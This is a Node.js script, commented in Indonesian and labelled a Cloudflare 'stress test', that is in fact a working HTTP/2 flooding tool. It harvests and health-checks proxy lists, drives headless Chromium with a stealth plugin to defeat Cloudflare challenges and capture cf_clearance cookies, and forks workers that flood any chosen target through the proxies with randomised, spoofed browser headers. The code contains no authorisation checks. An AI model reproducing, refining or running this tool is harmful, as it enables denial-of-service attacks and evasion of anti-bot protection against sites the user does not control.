// stress-cf-ultimate.js - Uji Beban Cloudflare Ultimate (dengan debug & fallback)
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const axios = require("axios");
const { HeaderGenerator } = require('header-generator');
const UserAgent = require('user-agents');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

// ==================== DETEKSI CHROMIUM UNTUK TERMUX ====================
function findChromiumPath() {
  const possiblePaths = [
    '/data/data/com.termux/files/usr/bin/chromium-browser',
    '/data/data/com.termux/files/usr/bin/chromium',
    '/usr/bin/chromium-browser',
    '/usr/bin/chromium',
  ];
  for (const p of possiblePaths) {
    if (fs.existsSync(p)) return p;
  }
  try {
    const { execSync } = require('child_process');
    const result = execSync('which chromium-browser chromium 2>/dev/null', { encoding: 'utf8' });
    const lines = result.split('\n').filter(Boolean);
    for (const line of lines) {
      if (fs.existsSync(line)) return line;
    }
  } catch (e) {}
  return null;
}

const CHROMIUM_PATH = findChromiumPath();
if (!CHROMIUM_PATH) {
  console.error('[Fatal] Chromium tidak ditemukan. Instal dengan: pkg install chromium');
  process.exit(1);
}
console.log(`[Info] Menggunakan Chromium di: ${CHROMIUM_PATH}`);

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// ==================== KONFIGURASI ====================
if (process.argv.length < 7) {
  console.log(`Usage: node stress-cf-ultimate.js <target> <duration_sec> <rate> <threads> <proxy_source>
  proxy_source: file path atau URL API (http://...)
  `);
  process.exit();
}

const args = {
  target: process.argv[2],
  duration: parseInt(process.argv[3]),
  rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxySource: process.argv[6]
};

// ==================== FUNGSI PEMBANTU ====================
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomString(len) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < len; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
}

// ==================== DAFTAR HEADER DINAMIS ====================
const ACCEPT = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
];
const ACCEPT_LANG = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.8',
  'en-US,en;q=0.9,id;q=0.8',
  'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
  'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
  'zh-CN,zh;q=0.9,en;q=0.8',
  'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
  'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
];
const ACCEPT_ENCODING = [
  'gzip, deflate, br',
  'gzip, deflate',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'compress;q=0.5, gzip;q=1.0',
];
const PATHS = [
  '/', '/index.html', '/?page=1', '/?page=2', '/?category=news', '/?category=sports',
  '/?sort=newest', '/?filter=popular', '/?limit=10', '/search?q=' + randomString(5),
  '/api/v1/data', '/about', '/contact', '/products', '/services'
];
const METHODS = ['GET', 'HEAD', 'POST', 'OPTIONS'];
const REFERERS = [
  'https://www.google.com/',
  'https://www.bing.com/',
  'https://www.facebook.com/',
  'https://www.twitter.com/',
  'https://www.youtube.com/',
  'https://www.linkedin.com/',
  'https://www.reddit.com/',
  'https://github.com/',
  'https://stackoverflow.com/',
];
const CIPHERS = [
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256',
  'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256',
  'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA',
];

// ==================== PROXY PROVIDER / FILE ====================
async function fetchProxies(source) {
  let content = '';
  if (source.startsWith('http://') || source.startsWith('https://')) {
    console.log(`[Proxy] Mengambil dari URL: ${source}`);
    const resp = await axios.get(source, { timeout: 10000 });
    content = resp.data;
  } else {
    console.log(`[Proxy] Membaca dari file: ${source}`);
    content = fs.readFileSync(source, 'utf-8');
  }
  return content.split(/\r?\n/).map(line => line.trim()).filter(Boolean);
}

// ==================== MANAJEMEN PROXY ====================
class ProxyManager {
  constructor(proxies) {
    this.proxies = new Map();
    proxies.forEach(p => this.proxies.set(p, { fails: 0, success: 0, lastUsed: 0, alive: true }));
  }
  getProxy() {
    let best = null, bestScore = -Infinity;
    for (const [proxy, stats] of this.proxies) {
      if (!stats.alive) continue;
      const score = stats.success * 10 - stats.fails * 5 - (Date.now() - stats.lastUsed) / 1000;
      if (score > bestScore) { bestScore = score; best = proxy; }
    }
    if (best) {
      const s = this.proxies.get(best);
      s.lastUsed = Date.now();
      this.proxies.set(best, s);
    }
    return best;
  }
  mark(proxy, ok) {
    const s = this.proxies.get(proxy);
    if (!s) return;
    if (ok) { s.success++; s.fails = Math.max(0, s.fails - 1); }
    else { s.fails++; if (s.fails > 5) s.alive = false; }
    this.proxies.set(proxy, s);
  }
  getAliveCount() {
    let count = 0;
    for (const [, s] of this.proxies) if (s.alive) count++;
    return count;
  }
}

async function checkProxy(proxy, targetHost) {
  const [host, port] = proxy.split(':');
  return new Promise((resolve) => {
    const socket = net.connect(port, host, () => {
      socket.write(`CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
    socket.setTimeout(5000, () => { socket.destroy(); resolve(false); });
    socket.on('data', (data) => {
      const resp = data.toString();
      if (resp.includes('200 Connection established') || resp.includes('200 OK')) {
        socket.destroy();
        resolve(true);
      } else {
        socket.destroy();
        resolve(false);
      }
    });
    socket.on('error', () => resolve(false));
    socket.on('close', () => resolve(false));
  });
}

// ==================== CLOUDFLARE BYPASS (PUPPETEER) DENGAN DEBUG ====================
async function getCloudflareCookie(targetUrl, proxy = null) {
  console.log(`[CF-Bypass] Mencoba cookie melalui ${proxy || 'tanpa proxy'}`);
  const browser = await puppeteer.launch({
    headless: true,
    executablePath: CHROMIUM_PATH,
    args: proxy ? [`--proxy-server=http://${proxy}`] : [],
    ignoreHTTPSErrors: true,
  });
  try {
    const page = await browser.newPage();
    await page.setUserAgent(new UserAgent().toString());
    await page.setViewport({ width: 1280, height: 720 });
    // Tambahkan ekstensi stealth
    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
    const content = await page.content();
    // Cek apakah ada challenge Cloudflare
    const isCF = content.includes('cf-challenge') || 
                 content.includes('Checking your browser') ||
                 content.includes('cf-browser-verification') ||
                 content.includes('Cloudflare');
    if (!isCF) {
      console.log('[CF-Bypass] Target tidak menggunakan Cloudflare atau sudah bypassed.');
      await browser.close();
      // Kembalikan cookie kosong (tidak perlu)
      return { value: 'no_cf_required', isCF: false };
    }
    // Tunggu sebentar untuk challenge selesai
    await page.waitForFunction(
      () => !document.querySelector('#cf-challenge') && !document.querySelector('#challenge-form'),
      { timeout: 30000 }
    ).catch(() => {});
    const cookies = await page.cookies();
    await browser.close();
    const cf = cookies.find(c => c.name === 'cf_clearance');
    if (cf) {
      console.log(`[CF-Bypass] Berhasil: ${cf.value}`);
      return { value: cf.value, isCF: true };
    }
    // Jika gagal, simpan HTML untuk debug
    const html = await page.content();
    fs.writeFileSync('debug.html', html);
    console.log('[CF-Bypass] Gagal mendapatkan cf_clearance. HTML disimpan ke debug.html');
    return null;
  } catch (err) {
    console.error('[CF-Bypass] Error:', err.message);
    await browser.close();
    return null;
  }
}

// ==================== GENERATE HEADER DINAMIS ====================
function generateHeaders(parsedTarget, cookie) {
  const userAgent = new UserAgent().toString();
  const accept = randomElement(ACCEPT);
  const acceptLang = randomElement(ACCEPT_LANG);
  const acceptEnc = randomElement(ACCEPT_ENCODING);
  const referer = randomElement(REFERERS);
  const method = randomElement(METHODS);
  const path = randomElement(PATHS) + (Math.random() > 0.5 ? '?' + randomString(8) + '=' + randomString(5) : '');
  const headers = {
    ':method': method,
    ':path': path,
    ':scheme': 'https',
    ':authority': parsedTarget.hostname,
    'user-agent': userAgent,
    'accept': accept,
    'accept-language': acceptLang,
    'accept-encoding': acceptEnc,
    'cache-control': randomElement(['no-cache', 'max-age=0', 'no-store']),
    'pragma': randomElement(['no-cache', '']),
    'cookie': cookie && cookie.value ? `cf_clearance=${cookie.value};` : '',
    'referer': referer,
    'sec-ch-ua': `"${randomElement(['Google Chrome','Chromium','Microsoft Edge','Opera'])}";v="${randomInt(100, 120)}", "Not?A_Brand";v="99"`,
    'sec-ch-ua-mobile': randomElement(['?0', '?1']),
    'sec-ch-ua-platform': `"${randomElement(['Windows','macOS','Linux','Android','iOS'])}"`,
    'sec-fetch-dest': randomElement(['document', 'empty', 'script', 'style']),
    'sec-fetch-mode': randomElement(['navigate', 'cors', 'no-cors']),
    'sec-fetch-site': randomElement(['same-origin', 'cross-site', 'none']),
    'upgrade-insecure-requests': '1',
  };
  if (method === 'POST') {
    headers['content-type'] = 'application/x-www-form-urlencoded';
    headers['content-length'] = '0';
  }
  return headers;
}

// ==================== FLOODER DENGAN JEDA ACAK ====================
function runFlooder(cookie, proxyManager, parsedTarget) {
  const proxy = proxyManager.getProxy();
  if (!proxy) return;
  const [proxyHost, proxyPort] = proxy.split(':');

  const socket = net.connect({ host: proxyHost, port: parseInt(proxyPort) }, () => {
    socket.write(`CONNECT ${parsedTarget.hostname}:443 HTTP/1.1\r\nHost: ${parsedTarget.hostname}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
  });
  socket.setTimeout(10000, () => { socket.destroy(); proxyManager.mark(proxy, false); });

  socket.on('data', (chunk) => {
    const resp = chunk.toString();
    if (!resp.includes('200 Connection established') && !resp.includes('200 OK')) {
      socket.destroy();
      proxyManager.mark(proxy, false);
      return;
    }
    const tlsOpts = {
      ALPNProtocols: ['h2'],
      servername: parsedTarget.hostname,
      socket: socket,
      rejectUnauthorized: false,
      ciphers: randomElement(CIPHERS),
      secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
    };
    const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOpts);
    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.origin, {
      createConnection: () => tlsConn,
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
    });

    client.on('connect', () => {
      let sent = 0;
      const sendNext = () => {
        if (sent >= args.rate) return;
        const headers = generateHeaders(parsedTarget, cookie);
        const req = client.request(headers);
        req.on('response', () => { req.close(); req.destroy(); });
        req.on('error', () => {});
        req.end();
        sent++;
        const delay = randomInt(50, 300);
        setTimeout(sendNext, delay);
      };
      sendNext();
      proxyManager.mark(proxy, true);
    });

    client.on('error', () => { client.destroy(); socket.destroy(); proxyManager.mark(proxy, false); });
    client.on('close', () => { client.destroy(); socket.destroy(); });
  });

  socket.on('error', () => { socket.destroy(); proxyManager.mark(proxy, false); });
}

// ==================== MASTER / WORKER ====================
if (cluster.isMaster) {
  console.clear();
  console.log(`
\x1b[36m=========================================
   STRESS TEST CLOUDFLARE ULTIMATE
   Target: ${args.target}
   Durasi: ${args.duration} detik
   Rate: ${args.rate} req/detik per worker
   Threads: ${args.threads}
   Proxy source: ${args.proxySource}
   Chromium: ${CHROMIUM_PATH}
=========================================\x1b[0m
  `);

  (async () => {
    const rawProxies = await fetchProxies(args.proxySource);
    if (rawProxies.length === 0) { console.log('[Fatal] Tidak ada proxy.'); process.exit(1); }
    const proxyManager = new ProxyManager(rawProxies);
    const parsedTarget = new URL(args.target);

    console.log('[Proxy] Melakukan health check awal...');
    let alive = 0;
    for (const p of rawProxies.slice(0, 20)) {
      const ok = await checkProxy(p, parsedTarget.hostname);
      if (ok) alive++;
      else proxyManager.mark(p, false);
    }
    console.log(`[Proxy] ${alive} proxy hidup dari ${rawProxies.length}`);

    // Coba bypass Cloudflare
    let cookieData = null;
    const aliveProxies = rawProxies.filter(p => proxyManager.proxies.get(p).alive);
    // Coba melalui proxy yang hidup
    for (const p of aliveProxies.slice(0, 5)) {
      const result = await getCloudflareCookie(args.target, p);
      if (result && result.value) {
        cookieData = result;
        break;
      }
    }
    if (!cookieData) {
      // Coba tanpa proxy
      const result = await getCloudflareCookie(args.target, null);
      if (result && result.value) cookieData = result;
    }

    let cookie = null;
    if (cookieData) {
      if (cookieData.isCF === false) {
        console.log('[Master] Target tidak membutuhkan cookie Cloudflare. Lanjut tanpa cookie.');
        cookie = { value: '' };
      } else {
        cookie = { value: cookieData.value };
        console.log(`[Master] Cookie berhasil: ${cookie.value}`);
      }
    } else {
      console.log('[Warning] Gagal mendapatkan cookie. Mencoba tanpa cookie...');
      cookie = { value: '' };
    }

    // Fork worker
    for (let i = 1; i <= args.threads; i++) {
      const worker = cluster.fork();
      worker.send({ cookie, proxies: rawProxies });
    }

    setTimeout(() => {
      console.log(`\n[Master] Waktu habis. Menghentikan semua worker.`);
      for (const id in cluster.workers) cluster.workers[id].kill();
      process.exit(0);
    }, args.duration * 1000);

    setInterval(() => {
      console.log(`[Master] Worker: ${Object.keys(cluster.workers).length}, Proxy hidup: ${proxyManager.getAliveCount()}`);
    }, 10000);
  })();

} else {
  let cookie = null, proxyArray = [];
  process.on('message', (msg) => {
    if (msg.cookie) cookie = msg.cookie;
    if (msg.proxies) {
      proxyArray = msg.proxies;
      const manager = new ProxyManager(proxyArray);
      const parsedTarget = new URL(process.argv[2]);
      console.log(`[Worker ${cluster.worker.id}] Siap, ${proxyArray.length} proxy.`);
      setInterval(() => runFlooder(cookie, manager, parsedTarget), 100);
    }
  });
      }
